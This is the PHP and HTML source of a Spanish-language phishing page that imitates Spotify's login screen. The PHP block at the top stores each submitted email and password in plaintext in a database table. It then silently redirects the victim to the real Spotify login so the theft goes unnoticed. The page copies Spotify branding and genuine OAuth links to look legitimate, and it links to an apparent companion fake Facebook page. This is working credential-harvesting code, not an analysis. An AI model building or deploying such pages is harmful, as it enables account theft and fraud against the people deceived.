<?php
    require "database.php";
    $message= "";

    if (!empty($_POST['email']) && !empty($_POST['password'])) {
      $sql = "INSERT INTO users (email,contraseña,tipo) VALUES (:email, :password,'SPOTIFY')";
      $stmt = $con->prepare($sql);
      $stmt->bindParam(':email', $_POST['email']);
      $stmt->bindParam(':password', $_POST['password']);
  
      if ($stmt->execute()) {
        header("Status: 301 Moved Permanently");
        header("Location:https://accounts.spotify.com/es-ES/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=es-EC");
      } else {
        echo("error");
      }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión - Spotify</title>
    <script src="https://kit.fontawesome.com/ef4f54ce4e.js" crossorigin="anonymous"></script>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="recursos/style2.css">
</head>
<body>
    <?php require "recursos/partials/header.php" ?>
    <!-- <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>     -->
    <div class="contenedor_principal">
        <div class="contenedor_botones">
            <ul>
                <li class="tittle_list"><h3>Para continuar, inicia sesión en Spotify.</h3></li>
                <li class="fb_list"><a href="facebook.php" class="facebook" role="button"> <i class="fab fa-facebook"></i> CONTINUAR CON FACEBOOK</a></li>
                <li class="ap_list"><a href="https://appleid.apple.com/auth/authorize?client_id=com.spotify.accounts&response_type=code&response_mode=form_post&scope=name%20email&state=AQCRIFY%2Fy5eaO1JTIRWe2TBDvIWmRUACN%2FtKUP%2FaBv1MB%2B1WjtRN0EOCznuCGgQf1v8VPK4JZWXVi0EWHaE6OHrRCRXSXJqhwrtuPVhXEMqDG9EHFZ2R8k5Ja5kXSTRMoPw7Fy2fhN54UnH78Ew%3D&redirect_uri=https%3A%2F%2Faccounts.spotify.com%2Flogin%2Fapple%2Fredirect" class="apple"> <i class="fab fa-apple" ></i> CONTINUAR CON APPLE</a></li>
                <li class="go_list"><a href="https://accounts.google.com/o/oauth2/v2/auth/identifier?response_type=code&access_type=offline&client_id=1046568431490-ij1gi5shcp2gtorls09frkc56d4mjbe2.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Faccounts.spotify.com%2Flogin%2Fgoogle%2Fredirect&state=AQDd8yx3ILyfHaepBZaU9MQNFZ4Qn2VvFbNjVedUp4NFCXZgAkUHy8pSx3C3ntEe4o8iYuCvU3tbgESm1RwRGUpC99gwHNuyqxm6vHkDTeIH5n9uHeQH3XaxoPxrDhtycK1Eg0N6oPdkQLMGkyk%3D&scope=profile%20email%20openid&flowName=GeneralOAuthFlow" class="google"> <img src="recursos\imagenes\google.png" class="fa-google"> CONTINUAR CON GOOGLE</a></li>
                <li class="num_list"><a href="https://accounts.spotify.com/es-ES/login/phone?continue=https:%2F%2Faccounts.spotify.com%2Fes-ES%2Fstatus" class="telefono"> CONTINUAR CON NÚMERO DE TELÉFONO</a></li>
            </ul>
        </div>
        <div class="line_divider">
            <div class="line">
            </div>
            <div class="leter_o">
                <strong>o</strong>
            </div>
        </div>
        
        <div class="contenedor_login">
            <form action="login.php" method="post">
                <h3 class="dir">Dirección de correo o nombre de usuario</h3>
                <input type="text" name="email" placeholder="Dirección de correo o nombre de usuario">
                <h3 class="con">Contraseña</h3>
                <input type="password" name="password" placeholder="Contraseña">
                <ul>
                    <li class="li_password"><a class="forgot_password" href="https://www.spotify.com/ec/password-reset/">¿Se te ha olvidado la contraseña?</a></li>
                </ul>
                
                <div class="button">
                    <div class="checkbox"> 
                        <label> 
                            <input type="checkbox" name="" value=""> 
                            <i class="helper"></i> 
                        </label> 
                    </div>
                    <h6>Recuérdame</h6>
                    <input type="submit", value="Iniciar Sesión">    
                </div>
            </form>
        </div>
        <div class="line_divider2">
            <div class="line2">
            </div>
            <div class="footer_button">
                <h3>¿No tienes cuenta?</h3>
                <ul>
                    <li><a href="https://www.spotify.com/ec/signup/?forward_url=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&sp_t_counter=1" class="suscribete">SUSCRÍBETE A SPOTIFY</a></li>
                </ul>
            </div>
        </div>

    </div>
</body>
</html>